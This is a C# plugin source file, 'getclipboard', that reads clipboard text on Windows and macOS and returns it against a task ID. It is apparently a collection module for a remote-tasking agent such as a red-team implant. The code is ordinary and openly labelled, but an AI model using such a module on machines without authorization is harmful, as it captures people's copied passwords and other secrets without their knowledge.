﻿using PluginBase;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class getclipboard
    {
        public static void Execute(Dictionary<string, object> args)
        {
            //I can either include this all in one (easier but larger plugin size)
            //Or I can split them into 3 separate DLL's and handle which one to load on the "load" side
            try
            {
                if (OperatingSystem.IsMacOS())
                {
                    PluginHandler.Write(OsxClipboard.GetText(), (string)args["task-id"], true);
                }
                else if (OperatingSystem.IsWindows())
                {
                    PluginHandler.Write(WindowsClipboard.GetText(), (string)args["task-id"], true);
                }
                else
                {
                    PluginHandler.Write("Not implemented on this OS yet.", (string)args["task-id"], true, "error");
                }
                //else
                //{
                //    return new ResponseResult
                //    {
                //        completed = "true",
                //        user_output = "Not implemented on this OS yet.",
                //        task_id = (string)args["task-id"],
                //        status = "error"
                //    };
                //}
            }
            catch (Exception e)
            {
                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
                return;
            }
        }

        //Clipboard code from TextCopy: https://github.com/CopyText/TextCopy
        //https://github.com/CopyText/TextCopy/blob/master/src/TextCopy/WindowsClipboard.cs
        static class WindowsClipboard
        {
            static void TryOpenClipboard()
            {
                var num = 10;
                while (true)
                {
                    if (OpenClipboard(default))
                    {
                        break;
                    }

                    if (--num == 0)
                    {
                        ThrowWin32();
                    }

                    Thread.Sleep(100);
                }
            }

            public static string? GetText()
            {
                if (!IsClipboardFormatAvailable(cfUnicodeText))
                {
                    return null;
                }
                TryOpenClipboard();

                return InnerGet();
            }

            static string? InnerGet()
            {
                IntPtr handle = default;

                IntPtr pointer = default;
                try
                {
                    handle = GetClipboardData(cfUnicodeText);
                    if (handle == default)
                    {
                        return null;
                    }

                    pointer = GlobalLock(handle);
                    if (pointer == default)
                    {
                        return null;
                    }

                    var size = GlobalSize(handle);
                    var buff = new byte[size];

                    Marshal.Copy(pointer, buff, 0, size);

                    return Encoding.Unicode.GetString(buff).TrimEnd('\0');
                }
                finally
                {
                    if (pointer != default)
                    {
                        GlobalUnlock(handle);
                    }

                    CloseClipboard();
                }
            }

            const uint cfUnicodeText = 13;

            static void ThrowWin32()
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }

            [DllImport("User32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool IsClipboardFormatAvailable(uint format);

            [DllImport("User32.dll", SetLastError = true)]
            static extern IntPtr GetClipboardData(uint uFormat);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr GlobalLock(IntPtr hMem);

            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool GlobalUnlock(IntPtr hMem);

            [DllImport("user32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool OpenClipboard(IntPtr hWndNewOwner);

            [DllImport("user32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool CloseClipboard();

            [DllImport("Kernel32.dll", SetLastError = true)]
            static extern int GlobalSize(IntPtr hMem);
        }

        //Clipboard code from TextCopy: https://github.com/CopyText/TextCopy
        //https://github.com/CopyText/TextCopy/blob/master/src/TextCopy/OsxClipboard.cs
        static class OsxClipboard
        {
            static IntPtr nsString = objc_getClass("NSString");
            static IntPtr nsPasteboard = objc_getClass("NSPasteboard");
            static IntPtr nsStringPboardType;
            static IntPtr utfTextType;
            static IntPtr generalPasteboard;
            static IntPtr initWithUtf8Register = sel_registerName("initWithUTF8String:");
            static IntPtr allocRegister = sel_registerName("alloc");
            static IntPtr stringForTypeRegister = sel_registerName("stringForType:");
            static IntPtr utf8Register = sel_registerName("UTF8String");
            static IntPtr generalPasteboardRegister = sel_registerName("generalPasteboard");

            static OsxClipboard()
            {
                utfTextType = objc_msgSend(objc_msgSend(nsString, allocRegister), initWithUtf8Register, "public.utf8-plain-text");
                nsStringPboardType = objc_msgSend(objc_msgSend(nsString, allocRegister), initWithUtf8Register, "NSStringPboardType");
                generalPasteboard = objc_msgSend(nsPasteboard, generalPasteboardRegister);
            }

            public static string? GetText()
            {
                var ptr = objc_msgSend(generalPasteboard, stringForTypeRegister, nsStringPboardType);
                var charArray = objc_msgSend(ptr, utf8Register);
                return Marshal.PtrToStringAnsi(charArray);
            }

            [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
            static extern IntPtr objc_getClass(string className);

            [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
            static extern IntPtr objc_msgSend(IntPtr receiver, IntPtr selector);

            [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
            static extern IntPtr objc_msgSend(IntPtr receiver, IntPtr selector, string arg1);

            [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
            static extern IntPtr objc_msgSend(IntPtr receiver, IntPtr selector, IntPtr arg1);

            [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
            static extern IntPtr objc_msgSend(IntPtr receiver, IntPtr selector, IntPtr arg1, IntPtr arg2);

            [DllImport("/System/Library/Frameworks/AppKit.framework/AppKit")]
            static extern IntPtr sel_registerName(string selectorName);
        }
        public class PluginResponse
        {
            public bool success { get; set; }
            public string output { get; set; }
        }
    }
}
